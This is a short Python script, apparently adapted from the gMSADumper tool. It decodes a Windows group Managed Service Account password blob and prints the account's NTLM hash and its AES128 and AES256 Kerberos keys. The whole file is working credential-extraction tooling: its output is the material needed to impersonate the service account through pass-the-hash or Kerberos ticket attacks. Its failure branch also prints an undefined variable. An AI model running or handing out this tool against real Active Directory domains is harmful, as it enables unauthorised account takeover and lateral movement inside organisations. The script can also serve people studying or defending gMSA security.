#!/usr/bin/env python3
# Thanks https://raw.githubusercontent.com/micahvandeusen/gMSADumper/refs/heads/main/gMSADumper.py !

# Takes input from https://gist.github.com/ArchiMoebius/190b411914823c6a55a7ad2c061bc115

import argparse

from binascii import hexlify
from base64 import b64decode

from Cryptodome.Hash import MD4

from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
from impacket.structure import Structure
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key

import sys

parser = argparse.ArgumentParser(description='Decrypt gMSA Passwords')
parser.add_argument('-b','--blob', help='blob', required=True)
parser.add_argument('-d','--domain', help='Domain', required=True)
parser.add_argument('-s','--sam', help='SAM', required=True)

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

def main():
    args = parser.parse_args()

    if len(args.blob) > 0:
        blob = MSDS_MANAGEDPASSWORD_BLOB()
        blob.fromString(b64decode(bytes(args.blob, 'utf8')))
        currentPassword = blob['CurrentPassword'][:-2]

        # Compute ntlm key
        ntlm_hash = MD4.new ()
        ntlm_hash.update (currentPassword)
        passwd = hexlify(ntlm_hash.digest()).decode("utf-8")

        print("NTLM: ", passwd)

        # Compute aes keys
        password = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')
        salt = '%shost%s.%s' % (args.domain.upper(), args.sam[:-1].lower(), args.domain.lower())
        aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents)
        aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents)
        print('%s:aes256-cts-hmac-sha1-96:%s' % (args.sam, aes_256_hash.decode('utf-8')))
        print('%s:aes128-cts-hmac-sha1-96:%s' % (args.sam, aes_128_hash.decode('utf-8')))
    else:
        print('Decode failed.')
        print(success)

if __name__ == "__main__":
    main()

